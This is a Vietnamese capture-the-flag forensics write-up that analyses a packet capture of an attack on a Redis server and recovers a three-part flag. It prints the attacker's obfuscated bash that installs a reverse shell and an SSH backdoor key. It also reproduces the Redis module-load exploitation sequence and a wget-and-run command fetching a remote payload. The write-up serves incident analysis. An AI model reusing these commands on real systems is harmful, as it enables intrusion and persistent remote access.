# _REDTRAILS_
Lần này thử thách ở mức medium và flag được chia làm 3 phần
![image](https://github.com/user-attachments/assets/3580497d-6464-4fe6-a50a-cbbee1645a3b)

Tải về tệp zip, giải nén ta có được 1 file .pcapng, mình dùng wireshark để phân tích

![image](https://github.com/user-attachments/assets/9a9a2e07-9448-4f0b-aee3-7464ec81b8af)

Mở ra thì mình thấy có 2 giao thức quen thuộc là **TCP**, **HTTP** và 1 giao thức lần đầu mình gặp là **RESP**

![image](https://github.com/user-attachments/assets/4591df69-e5f7-4042-a6c2-69845dab820e)

Follow HTTP stream của packet đó ta được một đoạn hội thoại giữa client và server như sau

![image](https://github.com/user-attachments/assets/30c631b4-966e-4b88-b92e-1b084bfa81de)

Nhìn cũng không hiểu lắm nhưng mình thấy 1 đoạn mã rất giống base64 nhưng bị viết ngược, mình thử convert lại bằng python

![image](https://github.com/user-attachments/assets/676810c5-0bff-423c-8679-b2f59c6ecd57)

Lấy đoạn mã đó và dùng cyberchef from base64, ta được

```
#!/bin/bash

lhJVXukWibAFfkv() {
	ABvnz='ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R'
	QOPjH='jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9'
	gQIxX='ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK'
    echo "$ABvnz$QOPjH$gQIxX" | base64 --decode | bash
}

x7KG0bvubT6dID2() {
	LQebW="ZWNobyAtZSAiXG5zc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUUM4VmtxOVVUS01ha0F4MlpxK1BuWk5jNm5ZdUVL"
	gVR7i="M1pWWHhIMTViYlVlQitlbENiM0piVkp5QmZ2QXVaMHNvbmZBcVpzeXE5Smc2L0tHdE5zRW10VktYcm9QWGh6RnVtVGdnN1oxTnZyVU52"
	bkzHk="bnFMSWNmeFRuUDErLzRYMjg0aHAwYkYyVmJJVGI2b1FLZ3pSZE9zOEd0T2FzS2FLMGsvLzJFNW8wUktJRWRyeDBhTDVIQk9HUHgwcDhH"
	q97up="ckdlNGtSS29Bb2tHWHdEVlQyMkxsQnlsUmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3SzEzdEhYekVrN09jaVVtZDUvWjdZdW9s"
	GYJan="bnQzQnlYOWErSWZMTUQvRlFOeTFCNERZaHNZNjJPN28yeFIwdnhrQkVwNVVoQkFYOGdPVEcwd2p6clVIeG1kVWltWGdpeTM5WVZaYVRK"
	HJj6A="UXdMQnR6SlMvL1loa2V3eUYvK0NQMEg3d0lLSUVybGY1V0ZLNXNrTFlPNnVLVnB4NmFrR1hZOEdBRG5QVTNpUEsvTXRCQytScVdzc2Rr"
	fD9Kc="R3FGSUE1eEcyRm4rS2xpZDlPYm0xdVhleEpmWVZqSk1PZnZ1cXRiNktjZ0xtaTV1UmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3"
	hpAgs="SzEzdEhYekVrN09jaVVtZDUvWjdZdW9sbnQzQnlYOWErSWxTeGFpT0FEMmlOSmJvTnVVSXhNSC85SE5ZS2Q2bWx3VXBvdnFGY0dCcVhp"
	FqOPN="emNGMjFieE5Hb09FMzFWZm94MmZxMnFXMzBCRFd0SHJyWWk3NmlMaDAyRmVySEVZSGRRQUFBMDhOZlVIeUN3MGZWbC9xdDZiQWdLU2Iw"
	CpJLT="Mms2OTFsY0RBbzVKcEVFek5RcHViMFg4eEpJdHJidz09SFRCe3IzZDE1XzFuNTc0bmMzNSIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5"
	PIx1p="cw=="
	echo "$LQebW$gVR7i$bkzHk$q97up$GYJan$HJj6A$fD9Kc$hpAgs$FqOPN$CpJLT$PIx1p" | base64 --decode | bash
}

hL8FbEfp9L1261G() {
	lhJVXukWibAFfkv
	x7KG0bvubT6dID2
}

hL8FbEfp9L1261G
```
Theo ý hiểu của mình thì đây là một đoạn mã Bash bao gồm một tập hợp các hàm mã hóa bằng Base64, giải mã và thực thi mã đã giải bằng lệnh Bash. Nhìn thấy base64 khá ngứa mắt nên viết 1 đoạn python để nối tất cả chúng lại

```
import base64

base64_strings = [
"ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R",
"jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9",
"ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK",
"ZWNobyAtZSAiXG5zc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUUM4VmtxOVVUS01ha0F4MlpxK1BuWk5jNm5ZdUVL",
"M1pWWHhIMTViYlVlQitlbENiM0piVkp5QmZ2QXVaMHNvbmZBcVpzeXE5Smc2L0tHdE5zRW10VktYcm9QWGh6RnVtVGdnN1oxTnZyVU52",
"bnFMSWNmeFRuUDErLzRYMjg0aHAwYkYyVmJJVGI2b1FLZ3pSZE9zOEd0T2FzS2FLMGsvLzJFNW8wUktJRWRyeDBhTDVIQk9HUHgwcDhH",
"ckdlNGtSS29Bb2tHWHdEVlQyMkxsQnlsUmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3SzEzdEhYekVrN09jaVVtZDUvWjdZdW9s",
"bnQzQnlYOWErSWZMTUQvRlFOeTFCNERZaHNZNjJPN28yeFIwdnhrQkVwNVVoQkFYOGdPVEcwd2p6clVIeG1kVWltWGdpeTM5WVZaYVRK",
"UXdMQnR6SlMvL1loa2V3eUYvK0NQMEg3d0lLSUVybGY1V0ZLNXNrTFlPNnVLVnB4NmFrR1hZOEdBRG5QVTNpUEsvTXRCQytScVdzc2Rr",
"R3FGSUE1eEcyRm4rS2xpZDlPYm0xdVhleEpmWVZqSk1PZnZ1cXRiNktjZ0xtaTV1UmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3",
"SzEzdEhYekVrN09jaVVtZDUvWjdZdW9sbnQzQnlYOWErSWxTeGFpT0FEMmlOSmJvTnVVSXhNSC85SE5ZS2Q2bWx3VXBvdnFGY0dCcVhp",
"emNGMjFieE5Hb09FMzFWZm94MmZxMnFXMzBCRFd0SHJyWWk3NmlMaDAyRmVySEVZSGRRQUFBMDhOZlVIeUN3MGZWbC9xdDZiQWdLU2Iw",
"Mms2OTFsY0RBbzVKcEVFek5RcHViMFg4eEpJdHJidz09SFRCe3IzZDE1XzFuNTc0bmMzNSIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5",
"cw==",
"lhJVXukWibAFfkv",
"x7KG0bvubT6dID2",

]
combined_base64 = "".join(base64_strings)
decoded_bytes = base64.b64decode(combined_base64)
decoded_string = decoded_bytes.decode('utf-8')
print(decoded_string)
```
Giải mã ta được 1 thứ gì đó..

![image](https://github.com/user-attachments/assets/96bbb608-cf11-4e11-a343-9405c40c1e5f)

**Trong đó có part 1 của flag luôn**
```
HTB{r3d15_1n574nc35"
```
Vì chỉ có một file được truyền qua bằng HTTP và đã được xử lí nên mình chuyển hướng sang khai thác thông tin của RESP

Trên mạng có 1 bài viết của redis nói về giao thức này, nhưng mình khá ngu tiếng anh nên mình hỏi chatgpt. Cụ thể

![image](https://github.com/user-attachments/assets/fd02abb3-9e87-43c6-972b-95f3d677753b)

**Ví dụ về cách hoạt động của RESP trên Redis:**

```
**Người dùng sử dụng redis để xác thực mật khẩu** nhập lệnh: AUTH password
Redis CLI sẽ xử lý phần đóng gói dữ liệu theo định dạng RESP trước khi gửi đến server Redis dưới dạng:

*2 // mảng gồm 2 thành phần
$4 // thành phần 1 có 4 kí tự
AUTH
$8 // thành phần 2 có 8 kí tự
password

Sau đó Redis server sẽ gửi 1 response về với cú pháp
+OK

Hiển thị với người dùng sẽ là
OK
```
Và theo thói quen mình follow tcp.stream eq từ 0->8 để xem chi tiết hội thoại giữa client và server

**Với eq 0**, khá dài nên mình chỉ đưa lên đây được 1 phần:

```
*2
$4
AUTH
$10
1943567864

+OK

*2
$7
COMMAND
$4
DOCS

*482
$11
zrandmember
*10
$7
summary
$53
Returns one or more random members from a sorted set.

.

.

.

```
Ở gần cuối có một lệnh từ request RESP là

```
*2
$7
HGETALL // Dùng để lấy toàn bộ các cặp key-value trong hash table users_table
$11
users_table
```

Và response của server trả về sẽ là user_name, password(đã được mã hóa) và email

```
*40 // Tức là có 40 users
$18
alice7185:password
$32
6ccd3011eba1f7f0cb6e6143c40580e1
$15
alice7185:email
$19
alice7185@htb.local

.

.

.

```

Mình ngồi lướt 1 lượt tại cũng khá ít và đã tìm được **part2** của flag ở cuối 🙈

```
$25
FLAG_PART:_c0uld_0p3n_n3w
```

Tiếp theo với eq 2
```
*2
$4
AUTH
$10
1943567864

+OK

*3
$7
SLAVEOF
$10
10.10.0.15
$4
6379

+OK

*4
$6
CONFIG
$3
SET
$3
DIR
$5
/data

+OK

*4
$6
CONFIG
$3
SET
$10
dbfilename
$11
x10SPFHN.so

+OK

*3
$6
MODULE
$4
LOAD
$13
./x10SPFHN.so

+OK

*3
$7
SLAVEOF
$2
NO
$3
ONE

+OK

*4
$6
CONFIG
$3
SET
$10
dbfilename
$8
dump.rdb

+OK

*2
$11
system.exec
$19
rm -v ./x10SPFHN.so

$64
adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2f

*2
$11
system.exec
$8
uname -a

$224
a64e32bc245f94d0b290094eafdb80d17b397747a91029f60788e2432f918f3f8dbb1fdd303a56644497353ebf17e3fb407cc36c04612c1570435507fa7e2e78c98d338f40c0b81187e6f5b549d051f6a9aa891d5642714263c8000af7d2b17c12181db077eb06dad7f843bf4e5aaca3

*2
$11
system.exec
$113
wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3

$960
394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952

*3
$6
MODULE
$6
UNLOAD
$6
system

+OK
```

Tổng quan của cuộc hội thoại là 
```
- Đoạn mã này mô tả một kịch bản tương tác với Redis server, tận dụng cấu hình và khả năng tải module để thực hiện hành vi bất hợp pháp hoặc độc hại, thường liên quan đến việc tấn công máy chủ. Mục đích tổng quát của nó bao gồm:

- Thiết lập kết nối Redis và xác thực:

- Dòng $4 AUTH gửi thông tin xác thực để đăng nhập.
Cấu hình Redis làm slave: Sử dụng SLAVEOF để chỉ định một máy chủ Redis master, nhằm đồng bộ dữ liệu với địa chỉ 10.10.0.15.

- Thay đổi thư mục làm việc và file dump:
CONFIG SET DIR /data và CONFIG SET dbfilename x10SPFHN.so nhằm thay đổi thư mục lưu trữ và tên file, chuẩn bị cho việc tải module độc hại.

-Tải module độc hại:
Sử dụng MODULE LOAD ./x10SPFHN.so để tải một file .so được thiết kế để thực thi mã tùy ý.

-Chuyển Redis về chế độ độc lập:
SLAVEOF NO ONE dừng chế độ slave, tránh việc đồng bộ dữ liệu thêm nữa.

-Khôi phục lại trạng thái Redis:
CONFIG SET dbfilename dump.rdb đặt lại tên file dump mặc định, giảm nghi ngờ.

- Thực thi lệnh từ xa:
system.exec được sử dụng để xóa file .so sau khi tải và thực thi mã độc hại.

.
.
.
```

Đọc xong chả hiểu gì nhưng mình có lưu tạm một chuỗi khá giống với chuỗi hex do Server Respone
```
adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2fa64e32bc245f94d0b290094eafdb80d17b397747a91029f60788e2432f918f3f8dbb1fdd303a56644497353ebf17e3fb407cc36c04612c1570435507fa7e2e78c98d338f40c0b81187e6f5b549d051f6a9aa891d5642714263c8000af7d2b17c12181db077eb06dad7f843bf4e5aaca3394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952
```
Đem cyberchef nhưng không ra được gì nên mình tiếp tục với eq 6

![image](https://github.com/user-attachments/assets/fcb0fb73-75db-4c3f-9bc8-f933e2fedb16)

Lại là một số lệnh mới mình có xem qua thì cũng không có gì nhưng mình nhìn thấy sự xuất hiện của file .ELF ở đây

![image](https://github.com/user-attachments/assets/ba692971-7e66-48d9-8bef-76b199d6a8e0)

```
ELF (Executable and Linkable Format) là một định dạng file nhị phân được sử dụng
phổ biến trong các hệ điều hành Unix-like (Linux, FreeBSD, v.v.) để lưu trữ:

- Executable files (Tệp thực thi).
- Object files (Tệp đối tượng được tạo trong quá trình biên dịch).
- Shared libraries (Thư viện dùng chung, như .so files).
- Core dumps (Ảnh bộ nhớ của chương trình khi bị lỗi).
```
Đối với eq 7 và 8 chỉ là cuộc hội thoại của giao thức TLS nên cũng kh có gì đặc biệt

Mình nghĩ file ELF kia là bước cuối r, nên mình lưu hex về và lưu file .elf rồi đem đi dịch ngược

![image](https://github.com/user-attachments/assets/8ca87803-317b-4c3d-922e-056417d574e4)

Mình có tải IDA về từ trc nhưng cũng không dùng bao giờ nên mình mất khá nhiều thời gian về cái này tại không hiểu gì về assembly

Mình có hỏi chat gpt thì biết được là nếu Code được viết bằng C thì có thể dịch ngược tiếp để gần gũi hơn

![image](https://github.com/user-attachments/assets/ce5fc988-4ea7-4b9f-8331-a3590070e069)

Nhìn mấy hàm quen thật nhưng thực sự cũng không hiểu gì, mình cố gắng đọc thật kĩ code xem có gì không thì thấy có dòng chữ

![image](https://github.com/user-attachments/assets/8545c6c7-738b-4cb2-a3e0-53af4a96e3df)

```
AES-256 (Advanced Encryption Standard 256-bit) là một thuật toán mã hóa khối đối xứng được sử dụng rộng rãi nhờ tính bảo mật và hiệu quả cao.
Nó được chuẩn hóa bởi NIST (National Institute of Standards and Technology) và là tiêu chuẩn mã hóa chính cho dữ liệu nhạy cảm
```

Mình cop toàn bộ đoạn Code đó hỏi chatGPT tiếp thì có được

![image](https://github.com/user-attachments/assets/85dba4ac-17fe-4b75-9af4-a3fc9f41879f)

Giải thích rất dài nhưng có 1 điểm là mục đích của nó được chatGPT chỉ ra rằng:

![image](https://github.com/user-attachments/assets/3eaeff93-a853-4a8e-8fa2-1ee6c0e0fc56)

Mình xem lại các cuộc hội thoại vừa nãy thì đúng là có một số response từ server -> client được gửi bằng mã hex 

Mình bắt đầu decode lần lượt, với key và iv của AES 256 là
```
h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz // key
YDP7ECjzuV7sagMN // iv
```

Mình thử lần lượt, đầu tiên là password của các user ở eq 0 thì kết quả không có gì

![image](https://github.com/user-attachments/assets/c559eac4-deff-4c0b-a593-59f0a951df46)

Mình bỏ qua eq 0, đến với eq 2 thì cuối cùng cũng done

![image](https://github.com/user-attachments/assets/34df6b6f-69ab-4b44-8ea4-95ce34a21859)

```
part3: _un3xp3c73d_7r41l5!}
```
**FLAG**: **HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}**

